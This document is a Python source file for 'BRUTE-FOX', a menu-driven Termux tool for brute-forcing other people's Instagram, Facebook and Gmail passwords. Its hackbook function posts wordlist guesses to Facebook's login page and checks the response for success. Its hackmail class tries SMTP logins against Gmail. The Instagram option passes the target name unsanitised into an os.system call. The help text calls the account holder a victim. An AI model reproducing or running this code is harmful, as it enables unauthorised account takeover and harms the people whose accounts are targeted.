# /bin/python !

from __future__ import absolute_import
from __future__ import print_function
import time
import os
import threading
import sys
import requests
from bs4 import BeautifulSoup
import smtplib
from time import sleep

passs = ('''
\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mSelecione o tipo de senha:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Padrão 
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Customizada
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m Voltar
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Sair

\033[1;91mbrutex\033[1;97m>>\033[1;92m ''')

main_menu = ('''
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Select an option:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Instagram
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Facebook
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m E-mail
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m Sair

\033[1;91mbrutex\033[1;97m>>\033[1;92m ''')

banr = ("""\033[1;92m   
    ____  ____  __  ______________     __________ _  __
   / __ )/ __ \/ / / /_  __/ ____/    / ____/ __ \ |/ /
  / __  / /_/ / / / / / / / __/______/ /_  / / / /   / 
 / /_/ / _, _/ /_/ / / / / /__/_____/ __/ / /_/ /   |  
/_____/_/ |_|\____/ /_/ /_____/    /_/    \____/_/|_|  
                                                       
\033[1;91m<═══\033[1;41m\033[1;97m by FOXS BLINTERS \033[;0m\033[1;91m═══>\033[1;92m""")

about = ("""\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mBruteforce Introdução:

\033[1;97m➤ \033[1;92mA ataque de força bruta é um ataque criptoanalítico que pode, em teoria, ser usado para tentar descriptografar quaisquer dados criptografados (exceto dados criptografados de maneira teoricamente segura).[1] Tal ataque pode ser usado quando não é possível tirar proveito de outras fraquezas em um sistema de criptografia (se houver) que tornariam a tarefa mais fácil.

Ao adivinhar a senha, esse método é muito rápido quando usado para verificar todas as senhas curtas, mas para senhas mais longas, outros métodos, como o ataque de dicionário, são usados ​​porque uma pesquisa de força bruta leva muito tempo. Senhas, frases secretas e chaves mais longas têm mais valores possíveis, tornando-as exponencialmente mais difíceis de decifrar do que as mais curtas.[2]

Os ataques de força bruta podem se tornar menos eficazes ofuscando os dados a serem codificados, tornando mais difícil para um invasor reconhecer quando o código foi quebrado ou fazendo com que o invasor trabalhe mais para testar cada suposição. Uma das medidas da força de um sistema de criptografia é quanto tempo teoricamente levaria para um invasor montar um ataque de força bruta bem-sucedido contra ele.[3]

Ataques de força bruta são uma aplicação de busca de força bruta, a técnica geral de resolução de problemas de enumerar todos os candidatos e verificar cada um.

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Características do BRUTE-FOX:

\033[1;97m➤ \033[1;92mVocê pode atacar com força bruta o Instagram, Facebook e ID de e-mail de sua vítima com 100 senhas/segundo. Não se preocupe, você pode usar a função de ataque automático (nesta função, você não precisa de sua própria lista de senhas).

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Author:

\033[1;97m➤ \033[1;92mTool BRUTE-FOX foi Criada Por: FOX BLINTER 
\033[1;92m""")

soc = """\033[1;91m[\033[;1;97m01\033[1;91m] \033[1;92mSelect any options

\033[1;91m[\033[;1;97m01\033[1;91m] \033[1;92mInstagram
\033[1;91m[\033[;1;97m02\033[1;91m] \033[1;92mFacebook
\033[1;91m[\033[;1;97m03\033[1;91m] \033[1;92mGithub
\033[1;91m[\033[;1;97m04\033[1;91m] \033[1;92mYouTube
\033[1;91m[\033[;1;97m05\033[1;91m] \033[1;92mTelegram
\033[1;91m[\033[;1;97m99\033[1;91m] \033[1;92mBack
\033[1;91m[00] \033[1;91mQuit

\033[1;97m[\033[1;91m??\033[1;97m] \033[1;91mbrutex>> \033[1;92m"""

def hackmail():
	class GmailBruteForce():
	    def __init__(self):
	        self.accounts = []
	        self.passwords = []
	        self.init_smtplib()
	
	    def get_pass_list(self,path):
	        file = open(path, 'r',encoding='utf8').read().splitlines()
	        for line in file:
	            self.passwords.append(line)
	
	    def init_smtplib(self):
	        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
	        self.smtp.starttls()
	        self.smtp.ehlo()
	    
	    def try_gmail(self):
	
	        for user in self.accounts:
	            for password in self.passwords:
	                try:
	                    self.smtp.login(user,password)
	                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
	                    self.smtp.quit()
	                    self.init_smtplib()
	                    break;
	                except smtplib.SMTPAuthenticationError:
	
	                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
	
	instance = GmailBruteForce()
	
	headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	
	instance.accounts.append(usr)
	instance.get_pass_list(passlist)
	
	instance.try_gmail()

def hackbook():
	if sys.version_info[0] !=3: 
		sys.exit()
	
	post_url='https://www.facebook.com/login.php'
	headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	payload={}
	cookie={}
	
	def create_form():
		form=dict()
		cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	
		data=requests.get(post_url,headers=headers)
		for i in data.cookies:
			cookie[i.name]=i.value
		data=BeautifulSoup(data.text,'html.parser').form
		if data.input['name']=='lsd':
			form['lsd']=data.input['value']
		return (form,cookie)
	
	def function(email,passw,i):
		global payload,cookie
		if i%10==1:
			payload,cookie=create_form()
			payload['email']=email
		payload['pass']=passw
		r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
		if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
			open('temp','w').write(str(r.content))
			print('\npassword is : ',passw)
			return True
		return False
	
	file=open(passlist,'r')
	
	print("\nTargeted ID :",usr)
	print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92mTrying Passwords from password ..." , '\033[1;91m', '\n' )
	
	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print(str(i) +" : ",passw)
		if function(usr,passw,i):
			break



# main script start
os.system("xdg-open https://foxsblinters.simdif.com")
time.sleep(5)

while True:
	os.system('clear')
	print(banr)
	menu = input(main_menu)
	if menu == '01' or menu == '1':
		print('\n\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Run tor in another session of termux')
		sleep(1)
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target username:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No username detected\n')
			else:
				break
			
		while True:
			pas = input(passs)
			if pas == '01' or pas == '1':
				print()
				os.system("instagram-py --username " + usr + " --password-list .pass.txt")
				input("\033[1;94mPress ENTER To Continue")
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path: \033[1;97m')
				os.system("instagram-py --username " + usr + " --password-list " + passlist)
				input("\033[1;94mPress ENTER To Continue")
				break
			elif pas == '3' or pas == '03':
				break
			elif pas == '0' or pas == '00':
				exit()
				
	elif menu == '02' or menu == '2':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target User ID:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m User ID not detected')
			else:
				break
		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		hackbook()
		input("\033[1;94mPress ENTER To Continue")
		
	elif menu == '03' or menu == '3':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target Email ID:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Email ID not detected')
			else:
				break

		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected\n')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')

		hackmail()
		input("\033[1;94mPress ENTER To Continue")

	elif menu == '4' or menu == '04':
		print()
		print(about)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Do you want to go in main menu \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m:\033[1;97m ')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
				sleep(1)

	elif menu == '5' or menu == '05':
		os.system("clear")
		print(banr)
		print()
		print("\033[1;91m[\033[;1;97m~\033[1;91m] \033[1;92m futuramente... ")
		print()
		print()
		while True:
			fol = input(soc)
			if fol == '1' or fol == '01':
				print()
				print("\033[1;91m[*] \033[1;97mEspaço pro insta \n")
				time.sleep(1)
				os.system("xdg-open insta aq")
            
			elif fol == '2' or fol == '02':
				print()
				print("\033[1;91m[*] \033[1;97mEspaço pro facebook \n")
				time.sleep(1)
				os.system("xdg-open facebook aq")

			elif fol == '3' or fol == '03':
				print()
				print("\033[1;91m[*] \033[1;97mEspaço pro github \n")
				time.sleep(1)
				os.system("xdg-open github aq")

			elif fol == '4' or fol == '04':
				print()
				print("\033[1;91m[*] \033[1;97mespaço pro youtube \n")
				time.sleep(1)
				os.system("xdg-open youtube aq")
            
			elif fol == '5' or fol == '05':
				print()
				print("\033[1;91m[*] \033[1;97mEspaco pro telegram \n")
				time.sleep(1)
				os.system("xdg-open Telegram aq")

			elif fol == '9' or fol == '99':
				print()
				print("\033[1;91m[*]\033[1;92m Getting back ...\n")
				time.sleep(1)
				break

			elif fol == '0' or fol == '00':
				print()
				exit()

			elif fol == '':
				print()
				print('No input detected')
				print()

			else:
				print()
				print("\033[1;91mInvalid Input")
				print()

	elif menu == '00' or menu == '0':
		print()
		exit()
	elif menu == '':
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
		sleep(1)
	else:
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		sleep(1)


